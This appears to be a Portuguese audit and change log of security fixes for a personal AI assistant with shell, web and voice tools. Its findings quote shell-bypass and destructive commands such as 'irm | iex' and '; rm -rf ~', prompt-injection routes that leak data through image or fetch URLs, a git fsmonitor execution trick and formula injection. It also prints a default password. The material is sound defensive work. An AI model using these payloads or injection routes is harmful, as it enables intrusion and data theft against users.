# ORION — Plano de melhorias e o que foi feito

> Auditoria de 02/10/2026 (backend, front, regras, docs) e a execução dela, mais a segunda
> rodada de 03/10/2026 (achados R1–R11) a terceira de 06/10/2026 (L1–L12: login, MCP, ferramentas) a quarta de 06/10/2026 (V1–V8: visão, mídia, janela, briefing, captura, MCP, painel) a quinta de 07/10/2026 (V9–V13: segurança, roteamento, ferramentas que sobraram, quem serviu) e a sexta de 07/10/2026 (V14–V19: voz por clique, voz ao vivo, painel e acabamento). Cada achado tem ID, evidência e status. O que
> **não** foi verificado está na seção própria.
> Regras resultantes: [ORION_REGRAS.md](ORION_REGRAS.md). Plano de fases: [ORION_NUCLEO.md](ORION_NUCLEO.md).

## Achados e status

Legenda: ✅ resolvido e testado · 🟡 parcial · ⏳ depende de você ou de fase futura.

| ID | Sev. | Achado (evidência) | Status | Como |
|---|---|---|---|---|
| S1 | Alta | Câmara de Eco era blocklist de substring: `ri … -Recurse -Force`, `-r -fo`, `rmdir /s /q`, `-enc`, `[IO.Directory]::Delete`, `irm \| iex` saíam "baixo" | ✅ | Allowlist de leitura (`orion/policy/shell.py`); o legado delega a ela. `tests/policy/test_shell.py` tem os bypasses |
| S2 | Alta | Escrever no próprio código (`.py`, `.env` em `C:\Orion`) era "baixo risco" (lido do código) | ✅ | `PathGuard` protege a raiz do projeto; vale também para `gerar_documento` |
| B1 | Alta | Telegram devolvia o JSON cru do SSE (`{"tier":…}{"text":…}`) | ✅ | Parse correto + teste. (Correção de 03/10: só o *formato* do SSE é o mesmo; o bot do legado não envia o token que o `/chat` novo exige, então o canal novo `orion/channels/telegram.py` o substitui) |
| S3 | Média | Hub `:8765` e `/ws/voice` aceitavam qualquer `Origin`; `/upload` sem limite | 🟡 | Origin conferido (testado com `websockets` real) e 25 MB. **Falta:** `/mcp` e o REST do legado seguem sem login até a fase 5 |
| S4 | Média | `buscar_url` sem bloqueio de IP local (SSRF para o REST do próprio Orion) | ✅ | `url_guard` (loopback, LAN, Tailscale, metadados, redirects). Limite: janela de DNS rebinding; o agente do `navegar_web` navega livre depois da 1ª página |
| S5 | Média | Confirmação por frase no chat, estado global, "turno seguinte" | ✅ (novo) | Aprovação fora de banda por (sessão, ferramenta, hash), 10 min, uso único. No legado a frase continua, mas o gate ficou mais forte |
| B2 | Média | Um histórico global para todos os canais | ✅ (novo) | Sessão ativa por canal. Legado inalterado (será apagado) |
| S6 | Baixa | ~45 SQL por f-string, 184 `except Exception`, audit engolia erro | 🟡 | Audit do legado não perde mais registro em silêncio; código novo parametrizado e sem `pass`. SQL do legado fica até a fase 3–4 |
| B3 | Baixa | "Diretiva Nº 2" citada onde não existe mais; ferramenta bloqueava nuvem | ✅ | Textos corrigidos; a aprovação do especialista é por ser agente com shell, não por ser nuvem |
| B4 | Baixa | Prompt com hardware/stack datados; persona em arquivo editável | ✅ | Legado limpo; `orion/persona.py` versionado, imutável, com teste contra fato que envelhece |
| E1 | Média | Sem CI nem testes unitários | ✅ | `.github/workflows/ci.yml` (Linux, Windows, macOS) + 270 testes Python + 18 em Node |
| E2 | Média | Só Windows, caminhos `C:\Orion` fixos, `requirements` com pywin32/torch | 🟡 | Pacote novo é portável (`platformdirs`, caminhos por config). Legado segue Windows por desenho até a fase 7 |
| E3 | Média | Globals, `ChatRouter` com 22 argumentos, `on_event` deprecado | ✅ (novo) | `create_app` com lifespan e `AppState` injetado |
| E4 | Baixa | `script.js` monolítico, `innerHTML` sem teste | ✅ | Front redesenhado em módulos (03/10/2026): 8 puros testados em Node (99 testes) + 100 testes de navegador (97 com backend de mentira: fluxos, segurança, entrada, janela estreita, axe; 3 contra o Orion de verdade). Ver [ORION_FRONT.md](ORION_FRONT.md) |
| E5 | Baixa | Drift de docs, `.gitignore`, `requirements` | 🟡 | Corrigidos. A pasta `Orion_Ollama/` **não** foi renomeada (o `.bat`, o boot e o README apontam para ela; sai na fase 7) |
| E6 | Média | RAG sem avaliação (HR 10%, MRR 0.057) | ✅ | `orion.memory.eval` + conjunto fixo em pytest; CLI para as **suas** perguntas reais |
| F1 | Média | *(achado durante a execução)* o chat renderizava `![x](https://host-qualquer/?d=…)` do modelo: exfiltração por prompt injection | ✅ | Só imagem de `/imagens/<arquivo>`; 18 testes em Node, com checagem de que falham no código antigo |

## Segunda rodada (03/10/2026): lacunas do plano de mudança

Revisão do plano (NUCLEO §6–7) contra o código e o CI. Corte e operação: [ORION_CORTE.md](ORION_CORTE.md).

| ID | Sev. | Achado (evidência) | Status | Como |
|---|---|---|---|---|
| R1 | Alta | O importador trazia só `sessao` e `evento`; `lembrete`, `agendamento`, `tarefa`, `numero`, `prompt` eram contados e jogados fora, e o grafo (`precedeu`, `sobre`, `conecta`) nem era lido: vender o PC perderia esses dados | ✅ (formato do grafo não visto em export real) | Esquema v2 com migração; importador completo e idempotente; `orion verify-export` |
| R2 | Alta | Fase 0 sem prova: "contagens esperadas" não era conferível | ✅ | `orion verify-export` (contas por tabela, importação de ensaio, backup/restauração, busca no banco restaurado, só os **nomes** do `.env`) |
| R3 | Média | Importar sem informar o nome antigo do assistente marcava todas as respostas antigas como `system` (fora da busca) sem aviso | ✅ | Aviso no `import-surreal` e no `verify-export` listando os atores que viram `system` |
| R4 | Média | Sem plano de corte: depois da venda o legado não roda e o novo ainda não tem canais | ✅ (decisões suas pendentes) | [ORION_CORTE.md](ORION_CORTE.md): blocos A e B, critérios, rollback, o que decidir |
| R5 | Média | Sem agendador: lembretes e agendamentos migrados não teriam quem os disparasse; embeddings sem cliente; backup sem agendamento; sem consolidação | ✅ (embeddings e consolidação só com falsos) | `orion/jobs.py`, `GeminiEmbedder`, `Consolidator`, fila `/notifications`, backup diário em `ORION_BACKUP_DIR`, `ORION_VAULT_DIR` |
| R6 | Média | Host fora de `127.0.0.1` (Tailscale) podia ser liberado sem login | ✅ | Regra 17: o app recusa subir sem login (desde 06/10: senha **ou** `ORION_ADMIN_TOKEN`) |
| R7 | Baixa | `httpx` era importado em tempo de execução mas só declarado no grupo `dev`; docs defasadas ("CI remoto não rodou", fase 6 "só md.js") | ✅ | Dependência movida; docs sincronizadas; triagem das 55 ferramentas em [ORION_FERRAMENTAS.md](ORION_FERRAMENTAS.md) |
| R8 | Alta | O plano dizia que o bot do Telegram do legado lia o `/chat` novo "sem mudança": falso. O `/chat` novo exige `Authorization: Bearer` e o bot do legado não envia (401); o teste só provava o formato do SSE | ✅ (API falsa) | Canal novo `orion/channels/telegram.py`: default-deny, aprovação por botão, fila de avisos; regra 21 |
| R9 | Média | Sem `autostart` e sem ferramentas para agir no computador no núcleo novo | ✅ (Windows só no argv) | `orion autostart` (gera, não ativa) e `orion-desktop` v0 opt-in; ler segredo/chave agora confirma (regra 22) |
| R10 | Baixa | O `httpx` registra a URL em INFO, e a URL da API do Telegram carrega o token; campo `args` duplicado em `Approval` | ✅ | Logger do `httpx`/`httpcore` em WARNING (com teste); campo duplicado removido |
| R11 | Alta | O cartão de aprovação escondia o fim de comandos longos: o front cortava cada argumento em 700 caracteres e o servidor em 2000, então um comando com enchimento podia esconder `; rm -rf ~` depois do corte e o Antônio aprovaria sem ver | ✅ | `args_truncated` no evento e em `/approvals`; web e Telegram só deixam **negar** o que não cabe inteiro; a interface mostra o argumento sem cortar; regra 23 |

## Terceira rodada (06/10/2026): login, MCP e as ferramentas que faltavam

Tudo testado no Linux (CI nos três sistemas no PR). Cada item novo abaixo tem regra em [ORION_REGRAS.md](ORION_REGRAS.md).

| ID | Sev. | Achado (evidência) | Status | Como |
|---|---|---|---|---|
| L1 | Alta | Só havia um token estático (`ORION_ADMIN_TOKEN`) colado no navegador: sem senha, sem sessão, sem como sair, token no `localStorage` | ✅ | Login com senha (PBKDF2-SHA256, 600 mil iterações), sessão opaca e revogável em cookie `httpOnly` + `SameSite=Strict`, bloqueio crescente por cliente e global, CSRF por `Origin`, `orion set-password`, tela de entrada no front (e2e + axe). O hash fica em `auth.db`, **fora** do backup que vai para a nuvem. Regra 25 |
| L2 | Média | `/health` devolvia componentes e contagens, e `/docs`, `/redoc` e `/openapi.json` mapeavam a API, tudo sem login | ✅ | `/health` sem login só diz `status` e `version`; os três da documentação foram desligados |
| L3 | Média | A decisão da política só ia para o log: nada para consultar, nada que sobrevivesse a um reinício | ✅ | Tabela `audit` (esquema v3, migração automática); falha ao gravar nega o que não é leitura (regra 8, agora provada com o banco); `consultar_audit_log`; poda de 90 dias |
| L4 | Média | Sem cliente MCP: a fase 4 dependia de escrever tudo à mão | ✅ (servidor real só o de teste) | `orion/mcp_client.py` com o SDK oficial: a classe de risco vem do `mcp.json` e nunca do servidor, o que não for classificado confirma, `allow` esconde o resto, o servidor não herda `ORION_*` nem segredos. `orion mcp-check`. Regra 24 |
| L5 | Alta | *(achado ao portar `consultar_git`)* `git status` executa o `core.fsmonitor` do `.git/config` do repositório: um repositório baixado da web vira execução de programa | ✅ | Git com `core.fsmonitor=false`, pager, diff externo e `GIT_*` do ambiente desligados; teste com um repositório malicioso de verdade |
| L6 | Média | *(achado ao portar `gerar_documento`)* planilha gravada pelo modelo com texto começando em `=` virava **fórmula** quando o Antônio abrisse o arquivo | ✅ | Texto é sempre gravado como texto (`data_type='s'`), testado ida e volta com `openpyxl` |
| L7 | Média | O `url_guard` do legado conferia o DNS e deixava a biblioteca resolver de novo ao conectar (janela de DNS rebinding) | ✅ | `orion/netguard.py`: o IP conferido é o IP usado (Host e SNI do nome original), cada redirecionamento revalidado, tamanho limitado, HTML vira texto |
| L8 | Baixa | `abrir_app` era "escrita com log", mas abre qualquer programa ou arquivo | ✅ | Passou a execução: sempre confirma |
| L9 | Média | Um `buscar_url` depois de ler uma página injetada pode exfiltrar dados na própria URL (GET), e o taint só cobre escrita e execução | ✅ (fechado em 07/10, ver V9) | As ferramentas de web ficam **desligadas por padrão** (`ORION_WEB_TOOLS`); o endereço passa pelo `netguard` e fica no audit; e agora, depois de ler conteúdo externo, `buscar_url` e `navegar_web` pedem o seu aval a cada uso (regra 32) |
| L10 | Baixa | Telegram só entendia texto | ✅ (API falsa) | Voz (Whisper no Groq, o texto entendido aparece antes da resposta) e foto (imagem só naquele turno) |
| L11 | Alta | *(achado rodando o Orion de verdade com o front real)* aprovar uma ação no navegador falhava com HTTP 422: o front retoma sem corpo e `POST /approvals/{id}/resume` exigia um | ✅ | Corpo opcional (canal `web` por padrão) + teste. Os testes com backend de mentira não pegavam; agora há 3 testes contra o app, a política e o SQLite reais (`tests/front_e2e/test_orion_real.py`): login por cookie, conversa, aprovação que **executa de verdade** depois do clique, audit no banco, servidor MCP real e desligamento limpo. `mcp.json` e `auth.db` viraram arquivos sensíveis (ler e escrever confirmam) |
| L12 | Média | O Orion só rodava com Python e `uv`; faltava um executável; e o usuário padrão era `antonio` | ✅ no Linux; ⏳ Windows só no CI | Workflow `build-exe.yml`: compila (PyInstaller), **sobe o `.exe` e roda o teste de fumaça**, publica zip/release. Usuário padrão `admin`; senha de fábrica `261210@` **só no `.exe`**: não é anunciada antes do login, o app avisa depois, tem tela para trocar, e recusa subir exposto na rede enquanto ela valer. Ícone minimalista gerado por script |

## Quarta rodada (06/10/2026): visão, mídia, janela, briefing, captura, MCP e painel

Tudo testado no Linux com serviços de mentira (a suíte nova: visão, mídia/janela, briefing, captura, config e Telegram). Regras 28–30 em [ORION_REGRAS.md](ORION_REGRAS.md).

| ID | Sev. | Achado (evidência) | Status | Como |
|---|---|---|---|---|
| V1 | Alta | `capturar_tela`/`explicar_tela` eram "leitura" no legado, mas `explicar_tela` manda a tela inteira (e-mail, senha digitada, conversa) ao provedor do modelo | ✅ | `explicar_tela` virou **execução** (confirma sempre) e apaga a captura; `capturar_tela` virou escrita com log; destino da captura gerado pelo código; sem captura contínua; opt-in próprio `ORION_VISION_TOOLS` (regra 28) |
| V2 | Média | O resultado de um modelo de visão pode carregar instrução escrita na imagem (prompt injection visual) | ✅ | `explicar_tela`/`analisar_imagem` são conteúdo externo e contaminam a sessão; `analisar_imagem` passa pela política de leitura (segredo confirma) |
| V3 | Média | `controlar_janela` no legado não tinha tratamento de título ambíguo: "fechar firefox" fecharia a primeira janela que combinasse; e título de aba é texto de terceiros | ✅ | Busca ambígua **não age** (devolve a lista); título por variável de ambiente (Windows) ou só o id ao `wmctrl` (Linux); saída externa; confirma sempre (regra 29) |
| V4 | Baixa | Sem briefing: lembretes, agendamentos e tarefas só apareciam se o Antônio perguntasse | ✅ | `ORION_BRIEFING_AT` + `/briefing`: texto determinístico, um por dia, dentro de uma janela de 6 h para não mandar "bom dia" à noite |
| V5 | Média | Sem captura: uma ideia no celular não chegava ao vault | ✅ (Telegram só API falsa) | `/capturar` (texto, link, foto, voz) grava na caixa de entrada do vault, fora do modelo, com destino confinado ao vault (regra 30) |
| V6 | Média | O `mcp.example.json` tinha pacotes e nomes "de memória" e `@latest` no navegador | ✅ | Subi cada servidor (filesystem, fetch, git, Playwright, workspace-mcp) pelo `mcp-check`: nomes conferidos, versões fixadas. Achado: o cliente MCP só repassa o ambiente mínimo ao servidor, então atrás de proxy/CA corporativa o `uvx`/`npx` precisa do `env` declarado no servidor |
| V8 | Baixa | O estado do Orion ficava espalhado: cota dos modelos só no log, uso das CLIs só em contador, aprovações e decisões em endpoints e tabelas separados | ✅ | Painel único: `GET /painel`, a tela **Painel** do front (`#/painel`, `Alt+6`, `/painel`) e o comando `/painel` do Telegram. Só leitura e sem segredo: do gateway só o tipo do último erro (nunca corpo, URL ou chave); aprovações e decisões sem os argumentos. Regra 31 |
| V7 | Média | Ninguém decidira qual servidor de e-mail/agenda usar; muitos expõem `send_email` | ✅ (fluxo de login não testado) | `workspace-mcp` com `--permissions gmail:drafts calendar:full` **não registra envio**; classes e `allow` no exemplo; guia em [ORION_OPERACAO.md](ORION_OPERACAO.md) §5.1 |

**Não verificado nesta rodada:** (a) `capturar_tela`, mídia e janela **nunca rodaram** fora do Linux e, no Linux deste ambiente, sem tela, `playerctl` nem `wmctrl`: só o argv e o parsing estão testados; os scripts de PowerShell (captura, teclas de mídia, janela) não foram executados em um Windows; (b) a visão não foi chamada contra um modelo real (o formato é o `chat/completions` com `image_url`); (c) o `/capturar` e o `/briefing` só contra a API falsa do Telegram; (d) o fluxo de login Google do `workspace-mcp` (precisa da sua conta); (e) o briefing **não** lê a agenda (decisão sua: exige rodar o agente sem ninguém olhando, regra 18); (f) o painel mostra o que **o Orion viu desde que subiu** (chamadas, falhas, 429, quarentena): **não é a cota do provedor**, que só o OmniRoute conhece, e zera ao reiniciar; o `/painel` do Telegram só rodou contra a API falsa.

## Quinta rodada (07/10/2026): segurança, roteamento, ferramentas que sobraram e quem serviu

Decisão #5 fechada: **front só desktop** (sem PWA nem layout para celular; o celular segue pelo Telegram). Regras 32–34 em [ORION_REGRAS.md](ORION_REGRAS.md).

| ID | Sev. | Achado (evidência) | Status | Como |
|---|---|---|---|---|
| V9 | Média | *(fecha o L9)* uma página lida podia mandar o modelo buscar `https://dono-da-pagina/?d=<dados>`: `buscar_url` é leitura, então o taint não cobria | ✅ | `ToolSpec.egress`: numa sessão que já leu conteúdo externo, as ferramentas em que **o modelo escolhe o destino na rede** (`buscar_url`, `navegar_web`, e no `mcp.json` as marcadas com `"egress": true`) pedem aval a cada uso, com a URL inteira no cartão. Destino fixo (`consultar_clima`, `pesquisar_com_ia`) não é canal do atacante e segue livre. Teste no agente: a segunda URL vira cartão e a rede não é tocada. Regra 32 |
| V10 | Média | O `/mcp` do legado aceitava qualquer página do navegador (o CORS tolera `Origin: null` por causa do pywebview) e não conferia o `Host` (DNS rebinding) | ✅ no código; legado não testado com Qdrant/SurrealDB no ar | `origem.RecusaOrigemEstranhaNoMcp` (403 a qualquer `Origin` que não seja o próprio cérebro; Claude Code e Cursor não mandam `Origin` e seguem funcionando) e `TrustedHostMiddleware`. O resto da API legada não muda. Regra 34 |
| V11 | Baixa | O roteamento do legado era um regex de palavras-chave, sem motivo registrado | ✅ | `orion/router.py`: pontuação explicável (tamanho, código colado, verbos de trabalho, vários itens, tema técnico), camadas `rapido`/`pesado`/`visao`, `#pesado`/`#rapido`/`#visao` força; modelo por camada em `ORION_GATEWAY_MODEL_FAST/HEAVY` e `ORION_VISION_MODEL`; o padrão é o reserva; a retomada após aprovação fica na camada do pedido; o motivo vai na proveniência da resposta |
| V12 | Baixa | Sobravam `gerar_imagem` e `pesquisar_internet` | ✅ (APIs **não validadas** contra o serviço real) | `gerar_imagem` (Gemini, `ORION_IMAGE_MODEL`): nome do arquivo gerado no código, assinatura do arquivo conferida (PNG/JPEG/WEBP, nunca SVG), `/imagens/<arquivo>` só com login; `pesquisar_internet` (Brave Search, `ORION_BRAVE_API_KEY`): HTML removido, resultado é conteúdo externo. O front passou a aceitar `/imagens/<arquivo>` sem host. Regra 33 |
| V13 | Baixa | O painel mostrava só "o endpoint respondeu", não **quem** o OmniRoute usou | 🟡 | Lê os cabeçalhos documentados `X-OmniRoute-Provider`, `-Decision` e `-Fallback-Attempts` e mostra "Serviu: gemini ×30 · groq ×8". **A cota real do provedor não entra**: o OmniRoute a expõe em `/api/rate-limits`, `/api/monitoring/health` e `/dashboard/free-tiers` com credencial de "Management" cujo formato e cujas respostas a documentação não dá, e eu não tenho um OmniRoute no ar para descobrir |

**Não verificado nesta rodada:** (a) `gerar_imagem` (corpo `generateContent` com `responseModalities` e leitura de `inlineData`) e `pesquisar_internet` (`X-Subscription-Token`, `web.results[]`) foram escritos pela documentação, de memória, e testados só contra API falsa; o nome do modelo de imagem e se o plano gratuito cobre imagem mudam com o tempo; (b) os cabeçalhos `X-OmniRoute-*` seguem a documentação da versão v3.8.52, não um OmniRoute real; (c) a pontuação do roteamento é uma heurística: ela vai errar alguns casos (por isso o `#pesado`/`#rapido`) e só ficará boa com o seu uso; (d) a trava do `/mcp` e o `TrustedHost` do legado compilam e a lógica tem teste, mas o legado inteiro não subiu aqui; (e) o `orion_app.py` (pywebview) é o casco do legado e entra por `ORION_ADMIN_TOKEN`: o caminho desktop do Orion novo é o navegador (`orion.exe` abre `/ui/` com a senha), então não mexi nele e ele sai na fase 7.

## Sexta rodada (07/10/2026): voz (fase 6)

Pedido: "opção A, mas gostei da voz ao vivo também, nesse PR mesmo". Regras 35 e 36 em [ORION_REGRAS.md](ORION_REGRAS.md); como ligar em [ORION_OPERACAO.md](ORION_OPERACAO.md) §4.3.

| ID | Sev. | Achado (evidência) | Status | Como |
|---|---|---|---|---|
| V14 | Média | Só o Telegram tinha voz; o front tinha um botão de voz ao vivo ligado a um `/ws/voice` que o `orion.app` não implementava | ✅ no código; ⏳ APIs reais | **A — voz como canal do agente:** `/ws/voz` (`orion/voice.py`). Clique no microfone grava (MediaRecorder), outro clique envia; o servidor reconhece o formato pelo cabeçalho (webm, ogg, mp4, wav, mp3, flac), transcreve (Whisper no Groq, o mesmo `Transcriber` do Telegram), roda `Agent.run("web", texto)` e fala a resposta (edge-tts `pt-BR-AntonioNeural`, sem markdown, código nem endereço: `falavel`). O que foi entendido aparece como balão seu; a fala entra na mesma conversa do chat. **Aprovação continua só por botão**: se o turno pede uma, a voz diz "Preciso da sua aprovação" e o cartão aparece. Esc descarta a gravação; `{"cmd":"cancel"}` interrompe o turno |
| V15 | Média | A voz ao vivo do legado conversava direto com o Gemini, fora de tudo (sem política, sem audit, sem teto, sem checar `Origin`), e o laço de `receive()` parava no **primeiro** fim de turno (o SDK encerra o iterador a cada `turn_complete`) | ✅ no código; ⏳ API real | **B — voz ao vivo** reescrita em `/ws/voice`: **sem `tools`, sem memória, sem acesso ao computador** (o prompt diz isso e o modelo manda pedir ação pelo texto); opt-in (`ORION_VOICE_LIVE_ENABLED` + chave); login, `Origin` conferido, duração máxima, quadro de áudio limitado, início e fim no audit (`voz_ao_vivo`); laço de recepção que sobrevive a vários turnos; erro do provedor vira o tipo da exceção, sem mensagem; transcrição do que você disse (`heard`) e do que o Orion falou (`text`) |
| V16 | Média | WebSocket não tem CORS: qualquer página aberta no navegador poderia conectar em `ws://127.0.0.1:8000` com o cookie da sessão e abrir o microfone | ✅ | `_ws_abrir`: `Origin` precisa ser igual ao `Host` (`null` e outro site: fechado com 1008), cookie `SameSite=Strict`, e o token de máquina vai na **primeira mensagem** (nunca na URL, que vai para log). A CSP do front ganhou `media-src 'self' blob:` (o teste de navegador pegou: a fala não tocava) |
| V17 | Baixa | A voz ao vivo capturava com `ScriptProcessor` (obsoleto) e **nunca tinha rodado** contra o servidor novo | ✅ | `js/voice-worklet.js` (AudioWorklet, pedaços de 2048 amostras = 4096 bytes), com o `ScriptProcessor` só de reserva. **Teste de navegador de verdade:** o Chromium roda com microfone de mentira (`--use-fake-device-for-media-stream`), o worklet captura, o backend de mentira (`/ws/voice`) conta quadros e responde, e o teste confere `bytes == quadros × 4096`, a resposta no chat e o `stop` ao desligar. Também testa o erro do servidor (toast + botão desligado) |
| V18 | Baixa | Ninguém via se a voz estava pronta nem se falhava: só o erro do WebSocket | ✅ | `/health` ganhou `components.voice {click, live}` (opt-in **e** chave/gateway); `/painel` ganhou `voz` (turnos, sessões ao vivo, minutos, falhas, último erro) e `/painel` do Telegram uma linha 🎙️. Só contagem e mensagem de erro curta: nunca o texto falado nem o áudio |
| V19 | Baixa | Não dava para interromper a resposta falada nem um turno de voz lento | ✅ | O mesmo botão do microfone vira "Parar a resposta" enquanto o turno roda ou a fala toca; `Esc` e o botão de parar do chat também; o servidor cancela o turno e o front descarta o que ainda chegar até o `done` |

**Não verificado nesta rodada:** (a) Groq, edge-tts e Gemini Live **nunca foram chamados**: os testes usam transcritor, locutor e sessão falsos, e o formato do `LiveConnectConfig`/`send_realtime_input` segue o SDK `google-genai` instalado (2.28), não uma sessão real; o nome do modelo (`gemini-2.5-flash-native-audio-latest`) muda com o tempo; (b) o microfone real: os testes de navegador trocam `getUserMedia` e `MediaRecorder` por falsos, então **codec, permissão e latência reais não foram vistos**; (c) a voz ao vivo no navegador agora roda contra o servidor novo **no teste de navegador** (microfone de mentira do Chromium, AudioWorklet de verdade), mas o servidor de lá é o de mentira, não o Gemini; (d) o `.exe` ganhou `edge-tts` e `google-genai` no `orion.spec` sem eu poder compilar no Windows: o teste de fumaça do workflow `build-exe.yml` é quem confirma; (e) **palavra de ativação não foi feita nesta rodada** (feita na sétima, 07/10): precisa de um modelo "Orion" treinado (openWakeWord) e de captura de áudio no `orion-desktop`, e nenhum dos dois eu consigo validar daqui. Fica para quando você quiser gravar as amostras.

## Sétima rodada (07/10/2026): palavra de ativação, agenda no briefing e Ring 0 #4

Pedido: "pode fazer o 1 (Ring 0 #4), o 2 (palavra \"Orion\", agente escutando o microfone o tempo todo, deixa pronto tudo que puder) e o 3 (briefing lê a agenda, liberação total)". Regras 37 e 38 em [ORION_REGRAS.md](ORION_REGRAS.md); como ligar em [ORION_OPERACAO.md](ORION_OPERACAO.md) §4.4 e §5.1.

| ID | Sev. | Achado (evidência) | Status | Como |
|---|---|---|---|---|
| V20 | Baixa | Ring 0 #4 ("Hardware-Bound Logic Gates") conflitava com trocar de máquina e ficava em aberto desde 01/10 | ✅ | Virou **"Portabilidade"** (nada depende de hardware específico) no [ORION_NUCLEO.md §2](ORION_NUCLEO.md); a regra 16 já era a prova no código |
| V21 | Média | Não havia palavra de ativação: a voz só abria por clique | ✅ no código; 🟡 áudio real | `orion/wake.py`: laço numa thread lê o microfone em quadros de 80 ms (`sounddevice`), passa cada quadro a um detector **local** e só depois da palavra grava a fala (até o silêncio) e a entrega a `turno_de_voz`, a mesma via do botão. Bipe ao ouvir, resfriamento, teto por hora, pausa pelo painel e por `POST /voz/escuta`, `orion wake-test` para testar microfone e palavra sem agente nem rede, audit sem áudio. Regra 38 |
| V22 | Alta | Os dois caminhos que eu tinha em mente não eram iguais. Com o Vosk e a gramática só `["orion", "[unk]"]`, **25 de 30 frases sem a palavra ativaram** (o reconhecedor despeja qualquer fala em "orion"); com gramática livre, 8 de 12 acertos | ✅ medido com voz sintética | A gramática ganhou ~250 palavras concorrentes (`CONCORRENTES`). Medição **com amostras que não usei para montar a lista** (edge-tts, 4 vozes pt-BR e pt-PT, `vosk-model-small-pt-0.3`): **18 de 20 acertos e 0 de 60 falsos alarmes**; no primeiro lote, com frases escolhidas para confundir ("Marion e Ryan chegaram do oriente"), 11 de 12 e 1 de 30. O modelo escreve a palavra como "órion" **e** "orion": as duas entram em `ORION_WAKE_WORDS`. CPU: ~7% de um núcleo (200 s de áudio em 14 s). `scripts/wake_eval.py` repete a medição com as **suas** gravações |
| V23 | Média | O briefing não lia a agenda porque isso exigia rodar ferramenta sem ninguém olhando (regra 18) | ✅ no código; 🟡 conta real | `orion/agenda.py` chama **uma** ferramenta MCP fixa (`google__get_events`) **sem modelo**, com argumentos montados no código, só se o `mcp.json` a classifica como `read`; texto limpo (sem URL, ID nem controle), limitado, no audit, e falha vira "agenda indisponível". Aparece no briefing diário e no `/briefing` do Telegram. Regra 37 |

**O que eu não liberei no item 3 ("liberação total"):** rodar o **agente** sem supervisão. A liberação vale para a leitura da agenda, que é uma chamada fixa. Um agente sem ninguém olhando não tem quem aprove nada e teria de negar tudo que não é leitura; se você quer isso (resumo da agenda feito pelo modelo, por exemplo), é outra decisão e traz o risco do conteúdo de terceiros chegar a um modelo.

**Não verificado nesta rodada:** (a) **nenhum áudio de microfone real**: a escuta foi provada com microfone de mentira (quadros sintéticos), com o Vosk de verdade sobre voz sintética do edge-tts (que é limpa, de uma só pessoa por vez e sem ruído de sala) e com o laço completo contra a API do app; **ruído de ambiente, TV ao fundo, a sua voz e o seu microfone mudam as taxas acima**. (b) `sounddevice` não carrega aqui (sem PortAudio): `SoundDeviceSource` só foi testado com um `sd` falso; o AudioWorklet e o PortAudio de verdade dependem do seu sistema. (c) **openWakeWord não foi executado**: a biblioteca não instala neste Linux/Python 3.13 (a dependência `tflite-runtime` só tem roda para 3.11); só a camada em volta dela foi testada, com um modelo falso, e **você ainda precisa gerar o modelo `.onnx` de "orion"** (Colab oficial do projeto, voz sintética: não precisa gravar amostras). (d) Tocar a resposta usa `ffplay`/`mpg123`/`mpv` (Linux), `afplay` (macOS) e o `MediaPlayer` do PowerShell (Windows): só o `argv` foi testado, nenhum som foi tocado. (e) `get_events` do workspace-mcp 2.0.1: conferi os **parâmetros** subindo o servidor, mas **o texto que ele devolve não foi visto** (precisa de uma conta Google): a limpeza é genérica e a primeira consulta real pode mostrar linhas que valha ajustar. (f) O Vosk com o modelo grande ou com outra voz (a sua) pode acertar mais ou menos que o small testado.

## O que foi construído (por fase do NUCLEO)

| Fase | Entrega | Status |
|---|---|---|
| 0 — exportar dados | A ferramenta `backup_memoria` do legado já grava o formato que o importador lê (todas as tabelas); `orion verify-export` prova o export | ⏳ **sua** (PC, `.env`, `google_auth/`, vault) |
| 1 — fundação | `pyproject` (uv, ruff, pyright, pytest), `orion.config`, logging JSON, `/health`, CLI, CI Win+macOS | ✅ (CI verde em Linux, Windows e macOS na `main`) |
| 2 — cérebro | `orion.gateway` (API OpenAI-compat., streaming, fallback, quarentena em 429), `orion.agent` (persona + memória + ferramentas sob política), `orion.delegate` (claude/codex/gemini), `POST /chat` | ✅ com gateway e CLIs **falsos**; ⏳ OmniRoute e CLIs reais |
| 3 — memória | SQLite + FTS5 + vetores (numpy) com RRF, fatos editáveis, vault, backup/restore (`orion backup`, `orion restore`), eval, **importador completo do export** (esquema v2), lembretes/agendamentos/tarefas/números/prompts/grafo, fila de avisos, jobs, `GeminiEmbedder`, consolidação | ✅ no código; ⏳ chave de embeddings e suas perguntas reais |
| 4 — ferramentas | Política (classes de risco, aprovações, taint, audit em banco); memória, operação e `delegar`; `orion-desktop` completo (arquivos, documentos, sistema, processos, vigilância, mídia, janela, visão) e web (opt-ins); cliente MCP; 37 das 55 portadas | ✅ no código; ⏳ servidores MCP reais (e-mail, agenda, navegador) e o que depende de modelo multimodal |
| 5 — canais | Login com senha e tela de entrada; canal Telegram com voz e foto; `orion autostart`; guia do Tailscale em [ORION_OPERACAO.md](ORION_OPERACAO.md) | ✅ no código (Telegram só API falsa); ⏳ instalar o Tailscale e ativar no notebook |
| 6 — interface/voz | Front redesenhado em 03/10 (só desktop, [ORION_FRONT.md](ORION_FRONT.md)) com tela de entrada desde 06/10; voz no Telegram, **voz por clique** (`/ws/voz`) e **voz ao vivo** (`/ws/voice`, só conversa) no código desde 07/10; palavra de ativação no código (07/10: `orion/wake.py`, regra 38; falta testar com o seu microfone) | 🟡 |
| 7 — limpeza | Nada apagado: o legado ainda é a única coisa rodando com seus dados | ⏳ |

## Decisões que tomei por você (reverta se discordar)

1. **Loop de agente próprio, não PydanticAI** (decisão #3, alternativa). O fluxo de aprovação precisa
   controlar quando cada ferramenta roda e eu não tinha como validar PydanticAI contra um modelo real aqui.
2. **`executar_comando` sempre confirma**, salvo leitura provada (assumi seu "pode executar tudo" como aceite
   da recomendação que eu tinha dado).
3. **Pacote `orion/` na raiz**, ao lado do legado.
4. ~~Ring 0 #4 (Hardware-Bound) não foi alterado~~ → virou "Portabilidade" em 07/10/2026 (V20).
5. O legado importa `orion.policy` (só stdlib) para não ter duas políticas. Se `orion/` sumir, o gate do
   legado quebra: é acoplamento transitório, some na fase 7.

## O que não foi verificado

- **Windows e macOS:** o primeiro CI remoto rodou e já pagou o investimento: no **macOS** o Python do `uv` vem sem
  `enable_load_extension`, o que inviabilizaria o `sqlite-vec` no MacBook (troquei por vetores em tabela comum + numpy);
  no **Windows** a saída de uma CLI em Python voltava com acento corrompido (cp1252 no pipe; o `Delegator` agora força UTF-8
  no filho). Depois dessas correções o CI da `main` ficou verde nos três sistemas (run #8, 03/10). A rodada de 03/10
  (jobs, importador, embeddings) foi testada **no Linux**; o CI nos três sistemas dela está no PR.
